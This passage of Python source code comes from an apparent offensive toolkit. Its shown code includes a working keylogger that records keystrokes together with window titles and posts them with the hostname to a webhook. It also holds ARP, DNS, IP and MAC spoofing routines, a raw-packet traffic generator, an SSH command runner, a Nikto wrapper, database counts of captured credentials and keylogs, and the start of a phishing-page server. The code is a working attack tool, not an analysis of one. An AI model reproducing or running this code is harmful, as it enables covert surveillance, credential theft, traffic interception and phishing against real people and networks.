            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM managed_ips WHERE ip_address = ?', (ip,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get IP info: {e}")
            return None
    
    def get_traffic_logs(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT timestamp, traffic_type, target_ip, packets_sent, status 
                FROM traffic_logs ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get traffic logs: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM ssh_servers')
            stats['total_ssh_servers'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM ssh_commands')
            stats['total_ssh_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips')
            stats['total_managed_ips'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links')
            stats['total_phishing_links'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM keylogs')
            stats['total_keylogs'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM port_scans')
            stats['total_port_scans'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM spoofing_attempts')
            stats['total_spoofing_attempts'] = self.cursor.fetchone()[0]
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        return stats
    
    def close(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# KEYLOGGER CLASS
# =====================
class Keylogger:
    def __init__(self, db: DatabaseManager, webhook_url: str = None):
        self.db = db
        self.webhook_url = webhook_url
        self.listener = None
        self.running = False
        self.logging_enabled = True
        self.current_window = None
        self.toggle_key = Key.f9
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.batch_size = 50
        
        self.special_keys = {
            Key.space: "[SPACE]",
            Key.enter: "[ENTER]\n",
            Key.tab: "[TAB]",
            Key.backspace: "[BACKSPACE]",
            Key.delete: "[DELETE]",
            Key.shift: "[SHIFT]",
            Key.ctrl: "[CTRL]",
            Key.alt: "[ALT]",
            Key.cmd: "[CMD]",
            Key.esc: "[ESC]",
            Key.up: "[UP]",
            Key.down: "[DOWN]",
            Key.left: "[LEFT]",
            Key.right: "[RIGHT]",
        }
    
    def get_active_window(self) -> str:
        try:
            if platform.system() == "Windows":
                import win32gui
                window = win32gui.GetForegroundWindow()
                return win32gui.GetWindowText(window)
            elif platform.system() == "Darwin":
                from AppKit import NSWorkspace
                return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
            else:
                result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'],
                                      capture_output=True, text=True)
                return result.stdout.strip()
        except:
            return "Unknown"
    
    def on_press(self, key):
        if not self.logging_enabled:
            return
        
        if key == self.toggle_key:
            self.logging_enabled = not self.logging_enabled
            status = "started" if self.logging_enabled else "stopped"
            logger.info(f"Keylogging {status}")
            return
        
        if isinstance(key, Key):
            keystroke = self.special_keys.get(key, f"[{key.name.upper()}]")
        else:
            keystroke = getattr(key, 'char', str(key)) or "[UNKNOWN]"
        
        window = self.get_active_window()
        
        # Log to database
        self.db.log_keylog(keystroke, window)
        
        with self.buffer_lock:
            self.buffer.append({
                "keystroke": keystroke,
                "window": window,
                "timestamp": datetime.datetime.now().isoformat()
            })
            
            if len(self.buffer) >= self.batch_size:
                self.flush_buffer()
        
        print(f"{Colors.RED}[KEY]{Colors.RESET} {keystroke} @ {window}")
    
    def flush_buffer(self):
        if not self.webhook_url or not self.buffer:
            return
        
        try:
            payload = {
                "hostname": socket.gethostname(),
                "timestamp": datetime.datetime.now().isoformat(),
                "keys": self.buffer.copy()
            }
            requests.post(self.webhook_url, json=payload, timeout=5)
            with self.buffer_lock:
                self.buffer.clear()
        except Exception as e:
            logger.error(f"Failed to send keylog webhook: {e}")
    
    def start(self):
        if not KEYLOGGER_AVAILABLE:
            print(f"{Colors.RED}❌ pynput not installed. Run: pip install pynput{Colors.RESET}")
            return False
        
        print(f"{Colors.RED}👹 Keylogger Starting...{Colors.RESET}")
        print(f"{Colors.YELLOW}   Press F9 to toggle logging{Colors.RESET}")
        print(f"{Colors.YELLOW}   Press Ctrl+C to stop{Colors.RESET}\n")
        
        self.running = True
        self.logging_enabled = True
        
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
        return True
    
    def stop(self):
        self.running = False
        self.logging_enabled = False
        self.flush_buffer()
        if self.listener:
            self.listener.stop()
        print(f"\n{Colors.GREEN}✅ Keylogger stopped{Colors.RESET}")
    
    def get_status(self) -> bool:
        return self.running and self.logging_enabled

# =====================
# PASSWORD STRENGTH CHECKER
# =====================
class PasswordStrengthChecker:
    @staticmethod
    def check(password: str) -> Dict[str, Any]:
        score = 0
        feedback = []
        strength_levels = ["Very Weak", "Weak", "Medium", "Strong", "Very Strong"]
        
        length = len(password)
        if length < 8:
            feedback.append("Too short (minimum 8 characters)")
        elif length < 12:
            score += 1
            feedback.append("Good length")
        elif length < 16:
            score += 2
            feedback.append("Very good length")
        else:
            score += 3
            feedback.append("Excellent length")
        
        has_lower = any(c.islower() for c in password)
        has_upper = any(c.isupper() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password)
        
        if has_lower:
            score += 1
        else:
            feedback.append("Add lowercase letters")
        
        if has_upper:
            score += 1
        else:
            feedback.append("Add uppercase letters")
        
        if has_digit:
            score += 1
        else:
            feedback.append("Add numbers")
        
        if has_special:
            score += 2
        else:
            feedback.append("Add special characters")
        
        common_passwords = ["password", "123456", "qwerty", "admin", "letmein", "welcome"]
        if password.lower() in common_passwords:
            score = max(0, score - 3)
            feedback.append("Common password - easily guessable")
        
        if re.search(r'(abc|bcd|cde|def|efg|fgh|ghi|hij|ijk|jkl|klm|lmn|mno|nop|opq|pqr|qrs|rst|stu|tuv|uvw|vwx|wxy|xyz)', password.lower()):
            score = max(0, score - 2)
            feedback.append("Contains sequential letters")
        
        if re.search(r'(123|234|345|456|567|678|789|890)', password):
            score = max(0, score - 2)
            feedback.append("Contains sequential numbers")
        
        if re.search(r'(.)\1{2,}', password):
            score = max(0, score - 1)
            feedback.append("Contains repeated characters")
        
        score = min(10, score)
        level = min(4, score // 2)
        
        charset_size = 0
        if has_lower: charset_size += 26
        if has_upper: charset_size += 26
        if has_digit: charset_size += 10
        if has_special: charset_size += 32
        
        entropy = length * (charset_size.bit_length() - 1) if charset_size > 0 else 0
        
        if entropy < 20:
            crack_time = "Instant"
        elif entropy < 30:
            crack_time = "Seconds"
        elif entropy < 40:
            crack_time = "Hours"
        elif entropy < 50:
            crack_time = "Days"
        elif entropy < 60:
            crack_time = "Months"
        else:
            crack_time = "Years"
        
        return {
            "password": "********",
            "length": length,
            "score": score,
            "max_score": 10,
            "strength": strength_levels[level],
            "feedback": feedback,
            "has_lowercase": has_lower,
            "has_uppercase": has_upper,
            "has_digits": has_digit,
            "has_special": has_special,
            "entropy_bits": entropy,
            "estimated_crack_time": crack_time
        }

# =====================
# TRAFFIC MONITOR
# =====================
class TrafficMonitor:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.running = False
        self.monitor_thread = None
        self.last_stats = None
    
    def start(self):
        self.running = True
        self.monitor_thread = threading.Thread(target=self._monitor, daemon=True)
        self.monitor_thread.start()
        logger.info("Traffic monitoring started")
    
    def stop(self):
        self.running = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2)
        logger.info("Traffic monitoring stopped")
    
    def _monitor(self):
        while self.running:
            try:
                net_io = psutil.net_io_counters()
                connections = len(psutil.net_connections())
                
                if self.last_stats:
                    bytes_sent = net_io.bytes_sent - self.last_stats.bytes_sent
                    bytes_recv = net_io.bytes_recv - self.last_stats.bytes_recv
                    self.db.add_traffic_stat(bytes_sent, bytes_recv, connections)
                
                self.last_stats = net_io
                time.sleep(5)
            except Exception as e:
                logger.error(f"Traffic monitor error: {e}")
                time.sleep(5)
    
    def get_current_stats(self) -> Dict[str, Any]:
        try:
            net_io = psutil.net_io_counters()
            connections = psutil.net_connections()
            
            tcp_count = sum(1 for c in connections if c.type == socket.SOCK_STREAM)
            udp_count = sum(1 for c in connections if c.type == socket.SOCK_DGRAM)
            
            return {
                "bytes_sent": net_io.bytes_sent,
                "bytes_recv": net_io.bytes_recv,
                "packets_sent": net_io.packets_sent,
                "packets_recv": net_io.packets_recv,
                "total_connections": len(connections),
                "tcp_connections": tcp_count,
                "udp_connections": udp_count,
                "errin": net_io.errin,
                "errout": net_io.errout,
                "dropin": net_io.dropin,
                "dropout": net_io.dropout
            }
        except Exception as e:
            return {"error": str(e)}

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.connections = {}
        self.shells = {}
        self.lock = threading.Lock()
        self.max_connections = 5
        self.default_timeout = 30
    
    def add_server(self, name: str, host: str, username: str, password: str = None,
                  key_file: str = None, port: int = 22, notes: str = "") -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'error': 'Paramiko not installed'}
        
        try:
            server_id = str(uuid.uuid4())[:8]
            if key_file and not os.path.exists(key_file):
                return {'success': False, 'error': f'Key file not found: {key_file}'}
            
            server = SSHServer(
                id=server_id,
                name=name,
                host=host,
                port=port,
                username=username,
                password=password,
                key_file=key_file,
                use_key=key_file is not None,
                timeout=self.default_timeout,
                notes=notes,
                created_at=datetime.datetime.now().isoformat()
            )
            
            if self.db.add_ssh_server(server):
                return {'success': True, 'server_id': server_id, 'message': f'Server {name} added successfully'}
            return {'success': False, 'error': 'Failed to add server to database'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def connect(self, server_id: str) -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'error': 'Paramiko not installed'}
        
        with self.lock:
            if server_id in self.connections:
                return {'success': True, 'message': 'Already connected'}
            if len(self.connections) >= self.max_connections:
                return {'success': False, 'error': f'Max connections ({self.max_connections}) reached'}
            
            server = self.db.get_ssh_server(server_id)
            if not server:
                return {'success': False, 'error': f'Server {server_id} not found'}
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                connect_kwargs = {'hostname': server['host'], 'port': server['port'],
                                 'username': server['username'], 'timeout': server.get('timeout', self.default_timeout)}
                
                if server.get('use_key') and server.get('key_file'):
                    key = paramiko.RSAKey.from_private_key_file(server['key_file'])
                    connect_kwargs['pkey'] = key
                elif server.get('password'):
                    connect_kwargs['password'] = server['password']
                else:
                    return {'success': False, 'error': 'No authentication method available'}
                
                client.connect(**connect_kwargs)
                self.connections[server_id] = client
                self.db.update_ssh_server_status(server_id, 'connected')
                return {'success': True, 'message': f'Connected to {server["name"]} ({server["host"]})'}
            except paramiko.AuthenticationException:
                return {'success': False, 'error': 'Authentication failed'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
    
    def disconnect(self, server_id: str = None):
        with self.lock:
            if server_id:
                if server_id in self.connections:
                    try:
                        self.connections[server_id].close()
                    except:
                        pass
                    del self.connections[server_id]
                    self.db.update_ssh_server_status(server_id, 'disconnected')
            else:
                for sid in list(self.connections.keys()):
                    self.disconnect(sid)
    
    def execute_command(self, server_id: str, command: str, timeout: int = None,
                       executed_by: str = "system") -> SSHCommandResult:
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return SSHCommandResult(
                    success=False, output='', error=connect_result.get('error', 'Connection failed'),
                    execution_time=time.time() - start_time, server=server_id)
        
        client = self.connections[server_id]
        server = self.db.get_ssh_server(server_id)
        server_name = server['name'] if server else server_id
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout or self.default_timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            execution_time = time.time() - start_time
            
            result = SSHCommandResult(
                success=len(error) == 0, output=output, error=error if error else None,
                execution_time=execution_time, server=server_name)
            
            self.db.log_ssh_command(server_id=server_id, command=command, success=result.success,
                                   output=output, execution_time=execution_time, executed_by=executed_by)
            return result
        except Exception as e:
            self.disconnect(server_id)
            return SSHCommandResult(success=False, output='', error=str(e),
                                   execution_time=time.time() - start_time, server=server_name)
    
    def get_servers(self) -> List[Dict]:
        servers = self.db.get_ssh_servers()
        for server in servers:
            server['connected'] = server['id'] in self.connections
        return servers
    
    def get_status(self, server_id: str = None) -> Dict:
        with self.lock:
            if server_id:
                return {'connected': server_id in self.connections}
            else:
                return {'total_connections': len(self.connections), 'max_connections': self.max_connections,
                       'connections': list(self.connections.keys())}

# =====================
# SPOOFING ENGINE
# =====================
class SpoofingEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.running_spoofs = {}
    
    def spoof_ip(self, original_ip: str, spoofed_ip: str, target: str, interface: str = "eth0") -> Dict[str, Any]:
        result = {'success': False, 'command': f"IP Spoofing: {original_ip} -> {spoofed_ip}", 'output': '', 'method': ''}
        
        if shutil.which('hping3'):
            try:
                exec_result = subprocess.run(['hping3', '-S', '-a', spoofed_ip, '-p', '80', target], 
                                           capture_output=True, timeout=5)
                if exec_result.returncode == 0:
                    result.update({'success': True, 'output': "IP spoofing using hping3", 'method': 'hping3'})
                    self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                    return result
            except:
                pass
        
        if self.scapy_available:
            try:
                from scapy.all import IP, TCP, send
                packet = IP(src=spoofed_ip, dst=target)/TCP(dport=80)
                send(packet, verbose=False)
                result.update({'success': True, 'output': f"IP spoofing using Scapy: Sent packet from {spoofed_ip} to {target}", 'method': 'scapy'})
                self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy failed: {e}"
        
        result['output'] = "IP spoofing failed. Install hping3 or scapy."
        self.db.log_spoofing('ip', original_ip, spoofed_ip, target, False)
        return result
    
    def spoof_mac(self, interface: str, new_mac: str) -> Dict[str, Any]:
        result = {'success': False, 'command': f"MAC Spoofing on {interface}: -> {new_mac}", 'output': '', 'method': ''}
        original_mac = self._get_mac_address(interface)
        
        if shutil.which('macchanger'):
            try:
                subprocess.run(['ip', 'link', 'set', interface, 'down'], timeout=5)
                mac_result = subprocess.run(['macchanger', '--mac', new_mac, interface], 
                                          capture_output=True, text=True, timeout=10)
                subprocess.run(['ip', 'link', 'set', interface, 'up'], timeout=5)
                if mac_result.returncode == 0:
                    result.update({'success': True, 'output': mac_result.stdout, 'method': 'macchanger'})
                    self.db.log_spoofing('mac', original_mac, new_mac, interface, True)
                    return result
            except Exception as e:
                result['output'] = f"macchanger failed: {e}"
        
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'down'], timeout=5)
            cmd_result = subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                                      capture_output=True, text=True, timeout=5)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], timeout=5)
            if cmd_result.returncode == 0:
                result.update({'success': True, 'output': f"MAC changed to {new_mac}", 'method': 'ip'})
                self.db.log_spoofing('mac', original_mac, new_mac, interface, True)
                return result
        except Exception as e:
            result['output'] = f"ip method failed: {e}"
        
        result['output'] = "MAC spoofing failed. Install macchanger or ensure root."
        self.db.log_spoofing('mac', original_mac, new_mac, interface, False)
        return result
    
    def _get_mac_address(self, interface: str) -> str:
        try:
            result = subprocess.run(['cat', f'/sys/class/net/{interface}/address'], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        return "00:00:00:00:00:00"
    
    def arp_spoof(self, target_ip: str, spoof_ip: str, interface: str = "eth0") -> Dict[str, Any]:
        result = {'success': False, 'command': f"ARP Spoofing: {target_ip} -> {spoof_ip}", 'output': '', 'method': ''}
        
        if shutil.which('arpspoof'):
            try:
                cmd = ['arpspoof', '-i', interface, '-t', target_ip, spoof_ip]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"arp_{target_ip}"] = process
                result.update({'success': True, 'output': f"ARP spoofing started: {target_ip} -> {spoof_ip}", 'method': 'arpspoof'})
                self.db.log_spoofing('arp', target_ip, spoof_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"arpspoof failed: {e}"
        
        if self.scapy_available:
            try:
                from scapy.all import Ether, ARP, sendp
                local_mac = self._get_mac_address(interface)
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
                sendp(packet, iface=interface, verbose=False)
                result.update({'success': True, 'output': f"ARP spoofing using Scapy", 'method': 'scapy'})
                self.db.log_spoofing('arp', target_ip, spoof_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy ARP failed: {e}"
        
        result['output'] = "ARP spoofing failed. Install dsniff (arpspoof) or scapy."
        self.db.log_spoofing('arp', target_ip, spoof_ip, interface, False)
        return result
    
    def dns_spoof(self, domain: str, fake_ip: str, interface: str = "eth0") -> Dict[str, Any]:
        result = {'success': False, 'command': f"DNS Spoofing: {domain} -> {fake_ip}", 'output': '', 'method': ''}
        hosts_file = "/tmp/dnsspoof.txt"
        try:
            with open(hosts_file, 'w') as f:
                f.write(f"{fake_ip} {domain}\n{fake_ip} www.{domain}\n")
        except:
            pass
        
        if shutil.which('dnsspoof'):
            try:
                cmd = ['dnsspoof', '-i', interface, '-f', hosts_file]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"dns_{domain}"] = process
                result.update({'success': True, 'output': f"DNS spoofing started: {domain} -> {fake_ip}", 'method': 'dnsspoof'})
                self.db.log_spoofing('dns', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"dnsspoof failed: {e}"
        
        if shutil.which('dnschef'):
            try:
                cmd = ['dnschef', '--fakeip', fake_ip, '--fakedomains', domain]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"dnschef_{domain}"] = process
                result.update({'success': True, 'output': f"DNS spoofing with dnschef: {domain} -> {fake_ip}", 'method': 'dnschef'})
                self.db.log_spoofing('dns', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"dnschef failed: {e}"
        
        result['output'] = "DNS spoofing failed. Install dnsspoof or dnschef."
        self.db.log_spoofing('dns', domain, fake_ip, interface, False)
        return result
    
    def stop_spoofing(self, spoof_id: str = None) -> Dict[str, Any]:
        if spoof_id and spoof_id in self.running_spoofs:
            try:
                self.running_spoofs[spoof_id].terminate()
                del self.running_spoofs[spoof_id]
                return {'success': True, 'output': f"Stopped spoofing: {spoof_id}"}
            except:
                pass
        for spoof_id, process in list(self.running_spoofs.items()):
            try:
                process.terminate()
            except:
                pass
        self.running_spoofs.clear()
        return {'success': True, 'output': "Stopped all spoofing processes"}

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.stop_events = {}
        self.has_raw_socket_permission = self._check_raw_socket_permission()
    
    def _check_raw_socket_permission(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except PermissionError:
            return False
        except:
            return False
    
    def get_available_traffic_types(self) -> List[str]:
        available = ['tcp_connect', 'http_get', 'http_post', 'https', 'dns']
        if self.scapy_available and self.has_raw_socket_permission:
            available.extend(['icmp', 'tcp_syn', 'tcp_ack', 'udp', 'arp'])
        return available
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int,
                        port: int = None, packet_rate: int = 100, executed_by: str = "system") -> TrafficGenerator:
        max_duration = 300
        if duration > max_duration:
            raise ValueError(f"Duration exceeds maximum ({max_duration} seconds)")
        
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            if traffic_type in ['http_get', 'http_post']:
                port = 80
            elif traffic_type == 'https':
                port = 443
            elif traffic_type == 'dns':
                port = 53
            elif traffic_type in ['tcp_syn', 'tcp_ack', 'tcp_connect']:
                port = 80
            elif traffic_type == 'udp':
                port = 53
            else:
                port = 0
        
        generator = TrafficGenerator(
            traffic_type=traffic_type, target_ip=target_ip, target_port=port,
            duration=duration, start_time=datetime.datetime.now().isoformat(), status="running")
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        thread = threading.Thread(target=self._run_traffic_generator,
                                 args=(generator_id, generator, packet_rate, stop_event))
        thread.daemon = True
        thread.start()
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_traffic_generator(self, generator_id: str, generator: TrafficGenerator,
                               packet_rate: int, stop_event: threading.Event):
        try:
            start_time = time.time()
            end_time = start_time + generator.duration
            packets_sent = 0
            bytes_sent = 0
            packet_interval = 1.0 / max(1, packet_rate)
            generator_func = self._get_generator_function(generator.traffic_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    packet_size = generator_func(generator.target_ip, generator.target_port)
                    if packet_size > 0:
                        packets_sent += 1; bytes_sent += packet_size
                    time.sleep(packet_interval)
                except Exception as e:
                    time.sleep(0.1)
            
            generator.packets_sent = packets_sent
            generator.bytes_sent = bytes_sent
            generator.status = "completed" if not stop_event.is_set() else "stopped"
            self.db.log_traffic(generator)
        except Exception as e:
            generator.status = "failed"
            self.db.log_traffic(generator)
        finally:
            if generator_id in self.active_generators:
                del self.active_generators[generator_id]
            if generator_id in self.stop_events:
                del self.stop_events[generator_id]
    
    def _get_generator_function(self, traffic_type: str):
        generators = {
            'icmp': self._generate_icmp,
            'tcp_syn': self._generate_tcp_syn,
            'tcp_ack': self._generate_tcp_ack,
            'tcp_connect': self._generate_tcp_connect,
            'udp': self._generate_udp,
            'http_get': self._generate_http_get,
            'http_post': self._generate_http_post,
            'https': self._generate_https,
            'dns': self._generate_dns,
            'arp': self._generate_arp
        }
        return generators.get(traffic_type, self._generate_tcp_connect)
    
    def _generate_icmp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, ICMP, send
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_syn(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, TCP, send
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_ack(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import IP, TCP, send
            packet = IP(dst=target_ip)/TCP(dport=port, flags="A", seq=random.randint(0, 1000000))
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_connect(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: ONI\r\n\r\n"
            sock.send(data.encode())
            try:
                sock.recv(4096)
            except:
                pass
            sock.close()
            return len(data) + 40
        except:
            return 0
    
    def _generate_udp(self, target_ip: str, port: int) -> int:
        try:
            if self.scapy_available:
                from scapy.all import IP, UDP, send
                data = b"ONI Test" + os.urandom(32)
                packet = IP(dst=target_ip)/UDP(dport=port)/data
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"ONI Test" + os.urandom(32)
                sock.sendto(data, (target_ip, port))
                sock.close()
                return len(data) + 8
        except:
            return 0
    
    def _generate_http_get(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "ONI"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _generate_http_post(self, target_ip: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            data = "test=data&from=oni"
            headers = {"User-Agent": "ONI", "Content-Length": str(len(data))}
            conn.request("POST", "/", body=data, headers=headers)
            response = conn.getresponse()
            response_data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _generate_https(self, target_ip: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target_ip, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "ONI"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 300
        except:
            return 0
    
    def _generate_dns(self, target_ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            dns_query = transaction_id + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query + qtype + qclass
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            return len(dns_query) + 8
        except:
            return 0
    
    def _generate_arp(self, target_ip: str, port: int) -> int:
        if not self.scapy_available:
            return 0
        try:
            from scapy.all import Ether, ARP, sendp
            local_mac = self._get_local_mac()
            packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
            sendp(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop_generation(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_generators(self) -> List[Dict]:
        active = []
        for gen_id, generator in self.active_generators.items():
            active.append({
                "id": gen_id, "target_ip": generator.target_ip, "traffic_type": generator.traffic_type,
                "duration": generator.duration, "packets_sent": generator.packets_sent
            })
        return active
    
    def get_traffic_types_help(self) -> str:
        help_text = "Available Traffic Types:\n\n📡 Basic Traffic:\n"
        help_text += "  icmp, tcp_syn, tcp_ack, tcp_connect, udp\n"
        help_text += "  http_get, http_post, https, dns, arp\n"
        return help_text

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.nikto_available = shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        
        if not self.nikto_available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        try:
            cmd = ['nikto', '-host', target]
            if options.get('ssl') or target.startswith('https://'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            if options.get('tuning'):
                cmd.extend(['-Tuning', options['tuning']])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=options.get('timeout', 300))
            scan_time = time.time() - start_time
            vulnerabilities = self._parse_output(result.stdout)
            
            return {
                'success': result.returncode == 0,
                'target': target,
                'timestamp': datetime.datetime.now().isoformat(),
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timeout', 'target': target}
        except Exception as e:
            return {'success': False, 'error': str(e), 'target': target}
    
    def _parse_output(self, output: str) -> List[Dict]:
        vulnerabilities = []
        for line in output.split('\n'):
            if '+ ' in line or 'OSVDB' in line or 'CVE' in line:
                vulnerabilities.append({'description': line.strip(), 'severity': 'medium'})
        return vulnerabilities
    
    def get_available_scan_types(self) -> List[str]:
        return ["full", "ssl", "cgi", "sql", "xss"]
    
    def check_target_ssl(self, target: str) -> bool:
        try:
            host = target.split(':')[0]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, 443))
            sock.close()
            return result == 0
        except:
            return False

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_phishing_page()
